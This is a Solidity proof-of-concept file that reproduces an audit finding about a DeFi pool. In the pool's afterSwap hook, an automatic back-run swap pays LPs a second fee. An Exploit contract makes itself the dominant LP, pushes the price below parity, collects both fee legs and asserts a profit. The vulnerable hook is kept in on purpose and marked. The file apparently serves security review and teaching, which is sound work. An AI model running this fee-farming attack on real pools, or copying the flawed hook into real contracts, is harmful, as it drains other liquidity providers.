// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Licredity — self-triggered _afterSwap back-run enables LP fee farming
    (Cyfrin review, finding #62349)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: when a swap pushes sqrtPriceX96 <= ONE, Licredity::_afterSwap
    auto back-runs a reverse swap (exactOut) that pays swap fees to LPs. A
    dominant LP around parity can push price just under 1, earn LP fees on both
    the push and the back-run legs, then redeem principal ~1:1 — mining fees
    with low price risk. The back-run branch is preserved (@> VULN).
    Harm: attacker notional (base+debt) increases by the double-dip LP fees.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 (base or debt fungible).
contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function burn(address from, uint256 amt) external {
        balanceOf[from] -= amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Uniswap-v4-style pool + Licredity afterSwap hook.
///         price is a simple uint (1e18 = parity "1"). Fee is a flat bps of
///         notional paid to the active LP set. The hook back-runs when price
///         ends <= 1e18, paying a second fee leg to LPs.
contract LicredityPool {
    uint256 public constant ONE = 1e18;
    uint256 public constant FEE_BPS = 30; // 0.30% per swap leg
    uint256 public constant BPS = 10_000;

    MockToken public immutable base; // token0
    MockToken public immutable debt; // token1 / debt fungible

    uint256 public price = ONE + 1e15; // start a hair above 1
    // simplified reserves for pricing (constant-product-ish for direction)
    uint256 public reserveBase = 1000 ether;
    uint256 public reserveDebt = 1000 ether;

    // dominant LP accounting: one aggregated LP position (the attacker in the PoC)
    address public lp;
    uint256 public lpLiquidity; // abstract L
    uint256 public lpFeesBase;
    uint256 public lpFeesDebt;

    // passive (non-attacker) liquidity share — so fee split is realistic
    uint256 public otherLiquidity;

    // exchangeFungible accounting from the back-run (finding's baseAmountAvailable)
    uint256 public baseAmountAvailable;
    uint256 public debtAmountOutstanding;

    bool private inBackRun;

    constructor(MockToken _base, MockToken _debt) {
        base = _base;
        debt = _debt;
    }

    function setLp(address _lp, uint256 liq, uint256 other) external {
        lp = _lp;
        lpLiquidity = liq;
        otherLiquidity = other;
    }

    function _payFees(uint256 feeBase, uint256 feeDebt) internal {
        uint256 totalL = lpLiquidity + otherLiquidity;
        if (totalL == 0) return;
        // attacker LP captures its pro-rata share
        lpFeesBase += (feeBase * lpLiquidity) / totalL;
        lpFeesDebt += (feeDebt * lpLiquidity) / totalL;
        // remainder stays in the pool (other LPs) — not tracked further
    }

    /// @notice zeroForOne = base -> debt (pushes price down). amountSpecified
    ///         >0 exact-in base, <0 exact-out debt (mirrors Uniswap convention).
    function swap(bool zeroForOne, int256 amountSpecified, address recipient)
        external
        returns (int256 amount0, int256 amount1)
    {
        address sender = msg.sender;
        uint256 absAmt = amountSpecified >= 0 ? uint256(amountSpecified) : uint256(-amountSpecified);

        if (zeroForOne) {
            // base in, debt out — price falls
            uint256 baseIn;
            uint256 debtOut;
            if (amountSpecified > 0) {
                baseIn = absAmt;
                debtOut = (absAmt * price) / ONE; // rough
            } else {
                debtOut = absAmt;
                baseIn = (absAmt * ONE) / price;
            }
            uint256 fee = (baseIn * FEE_BPS) / BPS;
            base.transferFrom(sender, address(this), baseIn + fee);
            debt.transfer(recipient, debtOut);
            _payFees(fee, 0);
            // move price down proportional to trade size
            uint256 drop = (baseIn * ONE) / reserveBase;
            if (drop >= price) price = ONE / 2;
            else price -= drop;
            if (price > ONE) {
                // ensure we can cross below 1 on a large enough push
            }
            amount0 = int256(baseIn + fee);
            amount1 = -int256(debtOut);
            reserveBase += baseIn;
            reserveDebt -= debtOut;
        } else {
            // debt in, base out — price rises
            uint256 debtIn;
            uint256 baseOut;
            if (amountSpecified > 0) {
                debtIn = absAmt;
                baseOut = (absAmt * ONE) / price;
            } else {
                baseOut = absAmt;
                debtIn = (absAmt * price) / ONE;
            }
            uint256 fee = (debtIn * FEE_BPS) / BPS;
            debt.transferFrom(sender, address(this), debtIn + fee);
            base.transfer(recipient, baseOut);
            _payFees(0, fee);
            uint256 rise = (debtIn * ONE) / reserveDebt;
            price += rise;
            amount0 = -int256(baseOut);
            amount1 = int256(debtIn + fee);
            reserveDebt += debtIn;
            reserveBase -= baseOut;
        }

        // hook: afterSwap back-run when price <= 1 (skip if we ARE the back-run)
        _afterSwap(sender, zeroForOne, amount0, amount1);
    }

    /// @notice Vulnerable afterSwap — verbatim control flow from Licredity::_afterSwap.
    function _afterSwap(address sender, bool /*zeroForOne*/, int256 amount0, int256 /*amount1*/) internal {
        // do nothing during the back run swap
        if (sender != address(this)) {
            uint256 sqrtPriceX96 = price; // reduced: price stands in for sqrtPriceX96
            uint256 ONE_SQRT_PRICE_X96 = ONE;

            // price below 1 will result in negative interest, which is not allowed
            // mint non-interest-bearing debt fungible to revert the effect of the current swap
            if (sqrtPriceX96 <= ONE_SQRT_PRICE_X96) {
                // FIX: revert swaps that would end below 1; or skip fees when sender==address(this)
                // back run swap to revert the effect of the current swap, using exactOut to account for fees
                // IPoolManager.SwapParams(false, -balanceDelta.amount0(), MAX_SQRT_PRICE_X96 - 1)
                // debt -> base (zeroForOne=false), exactOut base — second LP fee leg
                _backRunSwap(uint256(amount0 > 0 ? amount0 : -amount0)); // @> VULN: back-run pays a second LP fee leg
            }
        }
    }

    function _backRunSwap(uint256 baseOutTarget) internal {
        // perform reverse swap as address(this): debt in, base out, pay LP fees
        // simplified: buy back the base that was pushed in, paying fee in debt
        uint256 baseOut = baseOutTarget;
        if (baseOut > reserveBase / 2) baseOut = reserveBase / 2;
        uint256 debtIn = (baseOut * price) / ONE;
        if (debtIn == 0) debtIn = 1;
        uint256 fee = (debtIn * FEE_BPS) / BPS;

        // mint ephemeral debt fungible into the pool to fund the back-run
        // (mirrors Licredity minting debt to the pool manager then settling)
        debt.mint(address(this), debtIn + fee);
        // "swap" internal: burn debt reserves path, release base
        reserveDebt += debtIn;
        reserveBase -= baseOut;
        // fee to LPs in debt
        _payFees(0, fee);
        // price restored toward / above 1
        price = ONE + 1; // restored to just above parity

        // store amounts eligible for exchange (finding's accounting)
        baseAmountAvailable += baseOut;
        debtAmountOutstanding += debtIn;

        // hold the base in this contract for exchangeFungible
        // (base is already in the pool from the push leg)
    }

    /// @notice Redeem fees + principal roughly 1:1 via exchangeFungible reduction.
    function collectLpFees(address to) external {
        require(msg.sender == lp, "only lp");
        uint256 fb = lpFeesBase;
        uint256 fd = lpFeesDebt;
        lpFeesBase = 0;
        lpFeesDebt = 0;
        if (fb > 0) base.transfer(to, fb);
        if (fd > 0) debt.transfer(to, fd);
    }

    /// @notice 1:1 exchange of debt for base using back-run inventory (principal recovery).
    function exchangeFungible(uint256 debtAmount, address to) external {
        require(debtAmount <= debtAmountOutstanding, "no inventory");
        require(baseAmountAvailable >= debtAmount, "no base");
        debt.transferFrom(msg.sender, address(this), debtAmount);
        debt.burn(address(this), debtAmount);
        base.transfer(to, debtAmount);
        debtAmountOutstanding -= debtAmount;
        baseAmountAvailable -= debtAmount;
    }
}

/// @dev Attacker: dominate LP, push price below 1, collect double fee legs, redeem.
contract Exploit {
    MockToken public base; // CREATE 1
    MockToken public debt; // CREATE 2
    LicredityPool public pool; // CREATE 3 — vulnerable
    uint256 public notionalBefore;
    uint256 public notionalAfter;
    uint256 public profit;

    constructor() {
        base = new MockToken();
        debt = new MockToken();
        pool = new LicredityPool(base, debt);

        // seed pool reserves
        base.mint(address(pool), 1000 ether);
        debt.mint(address(pool), 1000 ether);

        // attacker is the dominant LP (80% of liquidity around parity)
        pool.setLp(address(this), 80 ether, 20 ether);

        // fund attacker with base + debt for the push swap and LP inventory
        base.mint(address(this), 100 ether);
        debt.mint(address(this), 100 ether);
    }

    function run() external {
        notionalBefore = base.balanceOf(address(this)) + debt.balanceOf(address(this));

        // 1) tiny nudge is skipped — price already starts > 1
        require(pool.price() > pool.ONE(), "price must start > 1");

        // 2) push: base -> debt, exact-out debt, large enough to cross below 1
        //    (triggers afterSwap back-run which restores price and pays 2nd fee leg)
        uint256 debtOut = 20 ether;
        // estimate base in ≈ debtOut * ONE / price, plus fee headroom
        uint256 approxBaseIn = 25 ether;
        base.approve(address(pool), approxBaseIn * 2);
        pool.swap(true, -int256(debtOut), address(this));

        // price restored by back-run
        require(pool.price() >= pool.ONE(), "post back-run price must be >= 1");

        // 3) collect LP fees (both push leg + back-run leg)
        pool.collectLpFees(address(this));

        // 4) optional: exchange residual at 1:1 for any back-run inventory we hold as debt
        //    (attacker already received debtOut from the push; principal recovery path)
        //    keep it simple: just measure notional

        notionalAfter = base.balanceOf(address(this)) + debt.balanceOf(address(this));
        // HARM: dominant LP's combined base+debt notional rose (fee mining drain)
        require(notionalAfter > notionalBefore, "drain should be profitable");
        profit = notionalAfter - notionalBefore;
        require(profit > 0, "no profit");
    }
}
